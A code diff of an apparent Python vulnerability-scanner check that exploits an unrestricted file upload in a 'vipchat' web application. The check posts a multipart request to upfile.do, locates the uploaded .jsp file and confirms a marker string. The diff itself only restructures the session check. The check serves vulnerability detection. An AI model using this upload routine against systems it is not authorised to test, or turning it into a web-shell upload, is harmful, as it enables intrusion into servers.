@@ -38,9 +38,10 @@ class Poc(ABPoc):
             getdata1 = '/vipchat/VerifyCodeServlet?var=clusterid'
             code, head, res, errcode, _ = hh.http(arg + getdata1)
             m1 = re.search('JSESSIONID=(.*?);',head)
-            if code!= 200:
-                return False
-            raw = """
+            if m1:
+                if code!= 200:
+                    return False
+                raw = """
 POST /vipchat/servlet/upfile.do HTTP/1.1
 Host: www.notedyy.com
 Proxy-Connection: keep-alive
@@ -70,17 +71,17 @@ just test c4ca4238a0b923820dcc509a6f75849b
 ------WebKitFormBoundaryUfIZSnIoUZx9mHpA--
 
 """
-            getdata2 = '/vipchat/servlet/upfile.do'
-            url = arg + getdata2
-            code, head, res, errcode, _ = hh.http(url, raw=raw)
-            m = re.search('/vipchat/home/info/(.*?).jsp', res)
-            if m :
-                url = arg + m.group(0)
-                code, head, res, errcode, _ = hh.http(url)
-                if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:    
-                    #security_hole(arg+getdata2+'   :file upload Vulnerable:')
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                getdata2 = '/vipchat/servlet/upfile.do'
+                url = arg + getdata2
+                code, head, res, errcode, _ = hh.http(url, raw=raw)
+                m = re.search('/vipchat/home/info/(.*?).jsp', res)
+                if m :
+                    url = arg + m.group(0)
+                    code, head, res, errcode, _ = hh.http(url)
+                    if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:    
+                        #security_hole(arg+getdata2+'   :file upload Vulnerable:')
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                            target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
